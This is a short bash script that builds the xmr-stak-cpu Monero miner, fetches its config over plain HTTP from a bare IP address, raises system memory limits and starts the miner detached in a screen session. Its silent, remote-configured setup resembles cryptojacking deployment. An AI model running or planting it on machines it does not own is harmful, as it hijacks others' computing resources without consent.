#!/bin/bash
apt-get update && sudo apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git
git clone https://github.com/mandaman2k/xmr-stak-cpu.git
cd xmr-stak-cpu/
cmake .
make
cd bin
wget http://104.131.78.117:4032/azl01/config.txt
echo "* soft memlock 262144" >> /etc/security/limits.conf
echo "* hard memlock 262144" >> /etc/security/limits.conf
sysctl -w vm.nr_hugepages=128
screen -d -m ./xmr-stak-cpu
